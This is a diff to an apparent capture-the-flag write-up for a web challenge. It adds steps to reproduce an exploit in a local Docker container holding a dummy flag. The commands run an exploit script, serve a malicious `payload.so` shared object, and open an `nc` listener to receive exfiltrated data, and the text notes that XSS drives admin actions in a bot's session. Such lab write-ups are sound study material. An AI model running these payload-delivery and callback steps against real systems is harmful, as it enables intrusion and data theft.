@@ -193,6 +193,33 @@ It builds `payload.so`, creates both fish entries, performs four reviews with wa
 
 The source includes defaults for the static directory and victim fish identifier. Read [evidence/notes.md](evidence/notes.md) for the HTML and JavaScript quoting traps, [evidence/audit-puppeteer-pp.md](evidence/audit-puppeteer-pp.md) for the local browser-option experiments, and [evidence/run-log.txt](evidence/run-log.txt) for the masked successful transcript.
 
+### Reproducing the four visits in the bundled local container
+
+The original [`assets/compose.yaml`](assets/compose.yaml), [`assets/Dockerfile`](assets/Dockerfile) and [`assets/flag.txt`](assets/flag.txt) are provided. The local flag file contains **only a dummy placeholder**, so a local test must not be mistaken for a challenge flag recovery. The Compose build itself has **not** been re-run in this audit.
+
+The orchestration does not start its own HTTP file server or callback listener. An actual local attempt therefore requires four terminals and a network-reachable **IPv4 address for the Docker host** (not `127.0.0.1` as seen from inside the container):
+
+```bash
+# Terminal 1: serve the local challenge on 127.0.0.1:8080
+cd ctf/platypwn2026/web/fishies/assets
+docker compose up --build
+
+# Terminal 2: create the shared library and serve it from the same directory
+cd ctf/platypwn2026/web/fishies
+python3 scripts/exploit.py --host http://127.0.0.1:8080 \
+  --lhost <DOCKER_HOST_IPV4> --lport 4466 --setup-only
+python3 -m http.server 8000 --bind 0.0.0.0 --directory /tmp/fishies-exploit/www
+
+# Terminal 3: optional fallback channel, prints raw HTTP POST requests
+nc -lvnp 4466
+
+# Terminal 4: run the original four-visit sequence
+python3 scripts/exploit.py --host http://127.0.0.1:8080 \
+  --lhost <DOCKER_HOST_IPV4> --lport 4466 --http-port 8000
+```
+
+`--setup-only` still compiles the library and displays the two injected ASCII strings; the file server must remain running during the actual exploit. The shared object's C code uses `inet_addr(LHOST)`, which is why `--lhost` must be an **IPv4 literal**, not `host.docker.internal` or a hostname. `--host`, by contrast, is the URL used by the controlling Python process on the host. The separate success checkpoints are the 200 response for `/static/dl/payload.so`, then the dummy local `/static/dl/flag.txt`.
+
 ## 9. Dead ends and fixes
 
 - The HttpOnly cookie could not be read, but it did not need to be: XSS performed admin actions in the bot's authenticated context.
